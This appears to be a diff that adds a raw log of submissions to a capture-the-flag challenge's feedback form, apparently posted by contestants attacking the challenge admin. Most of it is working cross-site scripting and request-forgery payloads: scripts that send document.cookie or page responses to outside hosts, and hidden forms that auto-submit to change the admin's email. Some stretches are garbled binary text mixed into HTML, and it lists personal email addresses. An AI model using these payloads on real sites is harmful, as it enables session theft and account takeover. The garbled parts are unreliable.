+				<h3>Do you have any feedback for us?</h3>
+				<form method="POST" action="?feedback">
+					<li class="field"><textarea name="f33db4ck" class="input textarea" placeholder="F33db4ck" rows="5"></textarea></li>
+					<input class="button button-orange"  name="confirm" type="submit" value="Send" />
+				</form>
+
+					</ul>
+		<h5><font color="#4a4d50">#ctf.wargame.vn</font></h5>
+		</div>
+</div>
+	</body>		
+</html>
+
+<htmlè]OìX\ö[»ÿ\›HŸ⁄[àﬁ\›[O›]OÇè[ö»ô[Hú›[\⁄Y]àôYèHò‹‹ÀŸ›[XûKò‹‹»èÇÇOõŸH€õÿYHôÿ›[Y[ùôõ‹õ\›Xãò€€ôö\õY[XZ[
+
+HÄ†£∆Fób6∆73“'&˜r#‡†ì∆É6∆73“&∆VB"7Gñ∆S“&6ˆ∆˜#¢6cCì&#‰÷&ñÚ67F∆S¬ˆÉ($Ò•µúÅÕ…åÙù	…•ç≠}	±Ωç¨π¡πúúÄº¯Ò•µúÅÕ…åÙù	…•ç≠}	±Ωç¨π¡πúúÄº<img src='Brick_Block.png' /><img src='Brick_Block.png' /><img src='Brick_Block.png' /[Y»‹òœI–úöX⁄◊–õÿ⁄Àúô…»œè[Y»‹òœI–úöX⁄◊–õÿ⁄Àúô…»œè[Y»‹òœI–úöX⁄◊–õÿ⁄Àúô…»√∆'"Òâ»Äº
+		<div class="fourteen columns"ÇBBÇBBO[ÇÇBBBOõ‹õHY]ŸHî‘’àX›[€èHèÿX›X⁄[ôŸHàò[YOHôõ‹õ\›XàÄ†êêêì∆É1!1<∞ÄÒôΩπ–ÅçΩ±Ω»Ùúçò–‰¿…Ñú˘≈›ï…—‰ƒ»Ã–ΩôΩπ– :)</h3>
+					<li class="field"><input type="password" class="password input" name="password" placeholder="Old Password" /€OÇÇBBBBOH€\‹œHôöY[èè[ú]\OHú\‹›€‹ôà€\‹œHú\‹›€‹ô[ú]àò[YOHõô]‹\‹›€‹ôàXŸZ€\èHìô]»\‹›€‹ôà√¬ˆ∆ì‡†êêêêì∆∆í6∆73“&fñV∆B#„∆ñÁWBGóS“&V÷ñ¬"6∆73“&V÷ñ¬ñÁWB"Ê÷S“&V÷ñ¬"f«VS“&FÁ¶Ê„Sc$v÷ñ¬Ê6ˆ“"Ω±§¯($$$$$Ò†ÿIf you want to change email, you just need enter the another one ;)</h6ÇBBBBO[ú]€\‹œHòù]€àù]€ã[‹ò[ôŸHàò[YOHò€€ôö\õHà\OHú›XõZ]àò[YOHê⁄[ôŸH\‹›€‹ôàœÇÇBBBBO[ú]€\‹œHòù]€àù]€ã[‹ò[ôŸHàò[YOHò€€ôö\õY[XZ[à\OHú›XõZ]àò[YOHê⁄[ôŸH[XZ[àœÇÇBBBBO[ú]€\‹œHòù]€àù]€ã[‹ò[ôŸHàò[YOHõŸ€›]à\OHú›XõZ]àò[YOHìŸ€›]àœÇÇBBBOŸõ‹õOÇÇBBBOœë»[›H]ôH[ûHôYYòX⁄»õ‹à\œœ⁄œÇÇBBBOõ‹õHY]ŸHî‘’àX›[€èHèŸôYYòX⁄»èÇÇBBBBOH€\‹œHôöY[èè^\ôXHò[YOHôåÃŸç⁄»à€\‹œHö[ú]^\ôXHàXŸZ€\èHëåÃŸç⁄»àõ›‹œHçHèè›^\ôXC¬ˆ∆ì‡†êêêêì∆ñÁWB6∆73“&'WGFˆ‚'WGFˆ‚÷˜&ÊvR"Ê÷S“&6ˆÊfó&“"GóS“'7V&÷óB"f«VS“%6VÊB"Û‡†êêêì¬ˆf˜&”‡††êêêêì¬˜V√‡†êì∆ÉPÒôΩπ–ÅçΩ±Ω»Ùàå—Ñ—ê‘¿à¯çç—òπ›Ö…ùÖµîπŸ∏ΩôΩπ–¯Ω†‘¯($$Ωë•ÿ¯(Ωë•ÿ¯($ΩâΩë‰¯$$(Ω°—µ∞
+<script type="text/javascript">
+var xhReq = new XMLHttpRequest();
+xhReq.open("POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change", false);
+xhReq.send("password=&newpassword=&email=dikei%40mailinator.com&confirm=Change+Email");
+
+var xhReq2 = new XMLHttpRequest();
+xhReq2.open("POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false);
+xhReq2.send("username=&password=&email=dikei%40mailinator.com&confirm=Forgot%3F");
+
+var xhReq3 = new XMLHttpRequest();
+xhReq3.open("POST", "http://184.72.34.238/abc123", false);
+xhReq3.send(null);
+
+
+</script>
+
+
+<script type="text/javascript">
+var xhReq = new XMLHttpRequest();
+xhReq.open("POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change", false);
+xhReq.send("password=&newpassword=&email=dikei%40mailinator.com&confirm=Change+Email");
+
+var xhReq2 = new XMLHttpRequest();
+xhReq2.open("POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false);
+xhReq2.send("username=&password=&email=dikei%40mailinator.com&confirm=Forgot%3F");
+
+var xhReq3 = new XMLHttpRequest();
+xhReq3.open("POST", "http://184.72.34.238/" + document.cookie, false);
+xhReq3.send(null);
+
+
+</script>
+
+aaaaaa
+<body onload="document.formsub.confirmemail.click()">
+<form method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" name="formsub">
+<input type="password"  name="password" placeholder="Old Password" />
+<input type="password"  name="newpassword" placeholder="New Password" /è[ú]\OHô[XZ[à€\‹œHô[XZ[[ú]àò[YOHô[XZ[àò[YOHô[ûõõçMåê€XZ[ò€€HãœÇè[ú]ò[YOHò€€ôö\õHà\OHú›XõZ]àò[YOHê⁄[ôŸH\‹›€‹ôà¿£∆ñÁWBÊ÷S“&6ˆÊfó&÷V÷ñ¬"GóS“'7V&÷óB"f«VS“$6ÜÊvRV÷ñ¬"(Ò•π¡’–ÄÅπÖµîÙâ±ΩùΩ’–àÅ—Â¡îÙâÕ’âµ•–àÅŸÖ±’îÙâ1ΩùΩ’–àÄº
+</form>
+</body>
+abacc
+
+aaaa
+123
+<html>
+<head>
+
+</head>
+<body>
+<form method="POST" action="?act=change" id="changeEmail">
+				<h3>EHLO, <font color="#f4902a">abc123</font> :)</h3>
+					<li class="field"><input type="password" class="password input" name="password" placeholder="Old Password"></li>
+					<li class="field"><input type="password" class="password input" name="newpassword" placeholder="New Password"></li>
+					<li class="field"><input type="email" class="email input" name="email" placeholder="Email" value="ctfadmin@mailinator.com"></li>
+					<h6>If you want to change email, you just need enter the another one ;)</h6>
+
+					<input class="button button-orange" name="confirm" type="submit" value="Change Email">
+
+				</form>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script type="text/javascript">
+$('#changeEmail').submit();
+</script>
+
+</body>
+
+</html>
+
+<html>
+<head>
+
+</head>
+<body>
+<form method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/" id="changeEmail">
+					<li class="field"><input type="text" class="text input" name="username" placeholder="Username" maxlength="10"></li>
+					<li class="field"><input type="password" class="password input" name="password" placeholder="Password"></li>
+					<li class="field"><input type="email" class="email input" name="email" placeholder="Email" value="ctfadmin@mailinator.com"></li>
+					<input class="button button-orange" name="confirm" type="submit" value="Forgot?">
+					<br><br>
+					<h6>If you want to recover your password, you just need enter the email address ;)</h6>
+				</form>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script type="text/javascript">
+$('#changeEmail').submit();
+</script>
+
+</body>
+
+</html>
+
+
+
+<script>
+var xmlhttp=new XMLHttpRequest();
+xmlhttp.open("GET","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/",false);
+xmlhttp.send();
+document.write(xmlhttp.responseText);
+</script
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({url: "http://184.72.34.238/" + document.cookie});
+</script>
+</body>
+</html>
+<script>
+var xmlhttp=new XMLHttpRequest();
+xmlhttp.open("GET","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/",false);
+xmlhttp.send();
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlhttp.responseText;
+</script
+<script>
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send( null );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText;
+</script>
+<script>
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send( null );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText.substrin(0,1);
+</script>
+
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+data: {
+password: '',
+newpassword: '',
+email: 'ctfadmin@mailinator.com'
+},
+type: 'post'
+
+}).done(function(respond){
+$.ajax({url: "http://184.72.34.238/" + respond});
+})
+
+</script>
+</body>
+</html>
+<script>
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send( null );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText.substring(0,1);
+</script>
+<script>
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send( null );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText.substring("#");
+</script>
+<script>
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send( null );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText.replace("#","L");
+</script>
+<script>alert('hello');</script>
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/',
+data: {
+password: '',
+newpassword: '',
+email: 'ctfadmin@mailinator.com'
+},
+type: 'post'
+
+}).done(function(respond){
+$.ajax({url: "http://184.72.34.238/", data: {payload: respond}, type: 'post'});
+})
+
+</script>
+</body>
+</html>
+<script>
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send( null );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText.replace("#","L");
+</script>
+
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/',
+data: {
+password: '',
+newpassword: '',
+email: 'ctfadmin@mailinator.com'
+},
+type: 'get'
+
+}).done(function(respond){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent(respond)});
+})
+
+</script>
+</body>
+</html>
+<script>
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send( null );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText.replace('\#'g,"L");
+</script>
+
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+data: {
+password: '',
+newpassword: '',
+email: 'ctfadmin@mailinator.com'
+},
+type: 'post'
+
+}).done(function(respond){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent(respond)});
+})
+
+</script>
+</body>
+</html>
+<script>
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send( null );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText.replace(/\#/g,"L");
+</script>
+
+<img src="javascript:alert('xss')">
+%71%75%65%61%72%79%3D%3C%73%63%72%69%70%74%3E%61%6C%65%61%72%74%28%64%63%75%6D%65%6E%6C%74%2E%63%6F%6F%6B%69%65%29%3C%2F%73%63%72%69%70%74%3E]http://example.com/search.cgi?%71%75%65%61...%72%69%70%74%3E
+<script>
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change", true );
+xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xmlHttp.send( "password=&newpassword=&email=danznn562@gmail.com&confirm=Change+Email" );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText.replace(/\#/g,"L");
+</script>
+
+
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+data: {
+password: '',
+newpassword: '',
+email: 'ctfadmin@mailinator.com',
+confirm: 'Change Email'
+},
+type: 'post'
+
+}).done(function(respond){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent(respond)});
+})
+
+</script>
+</body>
+</html>
+<script>
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change", false );
+xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xmlHttp.send( "password=&newpassword=&email=danznn562@gmail.com&confirm=Change+Email" );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText.replace(/\#/g,"L");
+</script>
+
+<scrpit>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/index.php?act=change", true);
+xhr.send("confirm=Change Email&password=&newpassword=&email=trungdl.one@gmail.com");
+</script>
+<script>
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change", false );
+xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xmlHttp.send( "password=&newpassword=&email=danznn562@gmail.com&confirm=Change+Email" );
+window.location="http://nurfed.madoka.be/test/cookie.php?c="+xmlHttp.responseText.replace(/\#/g,"L");
+</script>
+
+hehe
+</html>
+
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+data: {
+password: '',
+newpassword: '',
+email: 'ctfadmin@mailinator.com',
+confirm: 'Change Email'
+},
+type: 'post'
+
+}).done(function(respond){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent(respond)});
+}).fail(function(){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent("fail")});
+})
+
+</script>
+</body>
+</html>
+<scrpit>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/index.php?act=change", true);
+xhr.send("confirm=Change%20Email&password=&newpassword=&email=trung89.bk@gmail.com");
+</script>
+<script>
+function feedback()
+{
+	var url = "http://vnrootkit.hostei.com/?id=" + document.cookie;
+	window.open(url, '','width=2,height=1');
+}
+feedback();
+</script>
+<form name="changeemail" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" method="POST">
+ <input type="hidden" name="email" value="trung89.bk@gmail.com" />
+ <input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script type="text/javascript">
+document.forms["changeemail"].submit();
+</script>
+<script>document.forms[0].email.value="a@yopmail.com";document.forms[0].submit()</script>
+<script>
+function feedback()
+{
+	var url = "http://vnrootkit.hostei.com/?id=a" + document.cookie;
+	window.location.assign(url);
+}
+feedback();
+</script>
+
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+data: {
+password: 'abc123',
+newpassword: 'abc123',
+email: '',
+confirm: 'Change Email'
+},
+type: 'post'
+
+}).done(function(respond){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent(respond)});
+}).fail(function(){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent("fail")});
+})
+
+</script>
+</body>
+</html>
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/',
+data: {
+password: 'abc123',
+newpassword: 'abc123',
+email: '',
+confirm: 'Change Email'
+},
+type: 'get'
+
+}).done(function(respond){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent(respond)});
+}).fail(function(){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent("fail")});
+})
+
+</script>
+</body>
+</html>
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/',
+data: {
+password: 'abc123',
+newpassword: 'abc123',
+email: '',
+confirm: 'Change Email'
+},
+type: 'get'
+
+}).done(function(respond){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent(respond)});
+});
+
+</script>
+</body>
+</html>
+<script>
+var form = document.createElement("form");
+form.setAttribute("method", "post");
+form.setAttribute("action", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change");
+
+
+var hiddenField = document.createElement("input");              
+hiddenField.setAttribute("name", "email");
+hiddenField.setAttribute("value", "a@yopmail.com");
+form.appendChild(hiddenField);
+form.submit();
+</script>
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/',
+data: {
+password: 'abc123',
+newpassword: 'abc123',
+email: '',
+confirm: 'Change Email'
+},
+type: 'get'
+
+}).done(function(respond){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent(respond)});
+});
+
+</script>
+</body>
+</html>
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+data: {
+password: 'abc123',
+newpassword: 'abc123',
+email: '',
+confirm: 'Change Password'
+},
+type: 'get'
+
+}).done(function(respond){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent(respond)});
+});
+
+</script>
+</body>
+</html>
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+data: {
+password: '',
+newpassword: '',
+email: '',
+logout: 'Logout'
+},
+type: 'get'
+
+}).done(function(respond){
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent(respond)});
+});
+
+</script>
+</body>
+</html>
+'
+
+</html>
+
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+
+$.ajax({url: "http://184.72.34.238/?payload=" + encodeURIComponent(document.cookie)});
+
+
+</script>
+</body>
+</html>
+f33db4ck
+duyduc
+
+<html>
+<head></head>
+<body>
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+<script>
+$.ajax({
+	url: 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+	data: {
+	password:'',
+	newpassword: '',
+	email:'ctfadmin@mailinator.com',
+	confirm:'Change Email'
+	},
+	type: 'post'
+});
+</script>
+</body>
+</html>
+sed
+<iframe src='javascript:var form = document.createElement("form"); form.setAttribute("method", "post"); form.setAttribute("action", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change");   var hiddenField = document.createElement("input");               hiddenField.setAttribute("name", "email"); hiddenField.setAttribute("value", "a@yopmail.com"); form.appendChild(hiddenField); form.submit(); '></iframe>
+"><script>document.location='http://sovietw0rm.tk/'+document.cookie;</script>
+abc
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.cookie;</script>
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.location</script>
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.cookie;</script>
+<script>alert(123)</script>
+%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E
+"><script>document.location='https://google.com';</script>
+gagagaga
+"><script>document.location='http://sovietw0rm.tk/'+document.cookie;</script>
+<script>alert('attacked')</script>
+"><script>document.location='http://sovietw0rm.tk/a.html';</script>
+abc
+Hello
+Reply please ;)
+xxx
+<script>
+
+	document.getElementById("xss").submit();
+</script>
+<html>
+	<form method="POST" action="?act=change" name="xss" id="xss">
+	<input type="hidden" name="email" value="vn.rootkit@gmail.com"/>
+	<input name="confirm" type="hidden" value="Change Email" />
+	</form>
+</html>
+
+	<form method="POST" action="?act=change" name="xss" id="xss">
+	<input type="hidden" name="email" value="vn.rootkit@gmail.com"/>
+	<input name="confirm" type="hidden" value="Change Email" />
+	</form>
+<script>
+	document.getElementById("xss").submit();
+</script>
+
+
+	<form method="POST" action="?act=change" name="xss" id="xss">
+	<input type="hidden" name="email" value="vn.rootkit@gmail.com"/>
+	<input name="confirm" type="hidden" value="Change Email" />
+	</form>
+<script>
+	document.getElementById("xss").submit();
+function feedback()
+{
+	var url = "http://vnrootkit.hostei.com/?id=" + document.cookie;
+	window.open(url, '','width=2,height=1');
+}
+feedback();
+</script>
+
+<form method="POST" action="?act=change" name="xss" id="xss">
+	<input type="hidden" name="email" value="vn.rootkit@gmail.com"/>
+	<input name="confirm" type="hidden" value="Change Email" />
+	</form>
+<script>
+document.getElementById("xss").submit();
+function feedback()
+{
+	var url = "http://vnrootkit.hostei.com/?id=" + document.cookie;
+	window.location.assign(url);
+}
+feedback();
+
+</script>
+sdafasdfas df sadf sadfasdf
+asdf asdf asdf asdf 
+toy_nr2006@yahoo.com
+toy_nr2006@yahoo.com
+toy_nr2006@yahoo.com
+toy_nr2006@yahoo.com
+toy_nr2006@yahoo.com
+toy_nr2006@yahoo.com
+toy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.com
+toy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.comtoy_nr2006@yahoo.com
+<form method="POST" action="?act=change" name="xss" id="xss">
+	<input type="hidden" name="password"/>
+	<input type="hidden" name="newpassword"/>
+	<input type="hidden" name="email" value="vn.rootkit@gmail.com"/>
+	<input name="confirm" type="submit" value="Change Email" />
+	</form>
+<script>
+document.forms[0].submit();
+//document.getElementById("xss").submit();
+
+function feedback()
+{
+	var url = "http://vnrootkit.hostei.com/?id=" + document.cookie;
+	window.location.assign(url);
+}
+feedback();
+
+</script>
+<form method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" name="xss" id="xss">
+	<input type="text" name="password"/>
+	<input type="text" name="newpassword"/>
+	<input type="email" name="email" value="vn.rootkit@gmail.com"/>
+	<input name="confirm" type="submit" value="Change Email" />
+	</form>
+<script>
+document.forms[0].submit();
+//document.getElementById("xss").submit();
+
+function feedback()
+{
+	var url = "http://vnrootkit.hostei.com/?id=" + document.cookie;
+	window.location.assign(url);
+}
+feedback();
+</script>
+<script>
+function CSRF () {
+  var theForm, newInput1, newInput2;
+  theForm = document.createElement('form');
+  theForm.action = '?act=change';
+  theForm.method = 'post';
+  newInput1 = document.createElement('input');
+  newInput1.type = 'hidden';
+  newInput1.name = 'email';
+  newInput1.value = 'vn.rootkit@gmail.com';
+newInput2 = document.createElement('input');
+  newInput2.type = 'hidden';
+  newInput2.name = 'confirm';
+  newInput2.value = 'Change Email';
+
+  theForm.appendChild(newInput1);
+	theForm.appendChild(newInput2);
+   theForm.submit();
+}
+CSRF();
+</script>
+<script>
+function CSRF () {
+  var theForm, newInput1, newInput2;
+  theForm = document.createElement('form');
+  theForm.action = '?act=change';
+  theForm.method = 'post';
+  newInput1 = document.createElement('input');
+  newInput1.type = 'hidden';
+  newInput1.name = 'email';
+  newInput1.value = 'vn.rootkit@gmail.com';
+newInput2 = document.createElement('input');
+  newInput2.type = 'submit';
+  newInput2.name = 'confirm';
+  newInput2.value = 'Change Email';
+
+  theForm.appendChild(newInput1);
+	theForm.appendChild(newInput2);
+  document.getElementById('hidden_form_container').appendChild(theForm);
+  theForm.submit();
+}
+CSRF();
+</script><div id="hidden_form_container" style="display:none;"></div>
+Could you send me a email, pls?
+aaaaaaaaaaaa
+<div id="hidden_form_container" style="display:none;"></div>
+<script>
+function CSRF () {
+  var theForm, newInput1, newInput2;
+  theForm = document.createElement('form');
+  theForm.action = '?act=change';
+  theForm.method = 'post';
+  newInput1 = document.createElement('input');
+  newInput1.type = 'hidden';
+  newInput1.name = 'email';
+  newInput1.value = 'vn.rootkit@gmail.com';
+newInput2 = document.createElement('input');
+  newInput2.type = 'hidden';
+  newInput2.name = 'confirm';
+  newInput2.value = 'Change Email';
+
+  theForm.appendChild(newInput1);
+	theForm.appendChild(newInput2);
+  document.getElementById('hidden_form_container').appendChild(theForm);
+  theForm.submit();
+}
+CSRF();
+</script>
+
+aaaaaaaaaaa
+<div id="hidden_form_container" style="display:none;"></div>
+<script>
+function CSRF () {
+  var theForm, newInput1, newInput2;
+  theForm = document.createElement('form');
+  theForm.action = 'http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change';
+  theForm.method = 'post';
+  newInput1 = document.createElement('input');
+  newInput1.type = 'hidden';
+  newInput1.name = 'email';
+  newInput1.value = 'vn.rootkit@gmail.com';
+newInput2 = document.createElement('input');
+  newInput2.type = 'hidden';
+  newInput2.name = 'confirm';
+  newInput2.value = 'Change Email';
+
+  theForm.appendChild(newInput1);
+	theForm.appendChild(newInput2);
+  document.getElementById('hidden_form_container').appendChild(theForm);
+  theForm.submit();
+}
+CSRF();
+</script>
+
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+    <form name="plmrc" method="post"
+     action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change">
+        <input type="hidden" name="email" value="phieulang_hoanguit@yahoo.com" />
+        <input type="hidden" name="confirm" value="Change+Email" />
+    </form>
+    <script type="text/javascript">
+        document.plmrc.submit();
+    </script>
+</body>
+</html>
+
+
+Anything?
+abc
+abc
+abc
+abc
+abc
+abc
+acx
+gbf
+gbf
+js<script>alert(document.cookie)</script>
+ssdsdsds
+test
+fdf
+<input type="email" class="email input" name="email" placeholder="nguyenhuy_1001@yahoo.com.vn" />
+<input type="email" class="email input" name="email" value="nguyenhuy_1001@yahoo.com.vn" />
+jyv
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<SCRIPT>alert("XSS");</SCRIPT>
+123
+<iframe style=îvisibility: hiddenî name=îinvisibleFrameî>
+<form name=îmakePasswordî action=http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/ method=îPOSTî target=îhiddenî>
+<input type=îhiddenî name=îpasswordî value=îStolen!î>
+<input type=îhiddenî name=înewpasswordî value=îStolen!î>
+<input type=îhiddenî name=îemailî value=îhermec_98@yahoo.com.vnî>
+<input type="hidden" name="confirm" value="Change+Email"
+</form>
+<script>document.makePassword.submit();</script>
+</iframe>
+<iframe style=îvisibility: hiddenî name=îinvisibleFrameî>
+<form name=îmakePasswordî action=http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/ ?act=change method=îPOSTî target=îhiddenî>
+<input type=îhiddenî name=îemailî value=îhermec_98@yahoo.com.vnî>
+<input type="hidden" name="confirm" value="Change Email">
+</form>
+<script>document.makePassword.submit();</script>
+</iframe>
+<script>alert(document.cookie);</script>
+<iframe style=îvisibility: hiddenî name=îlolî> 
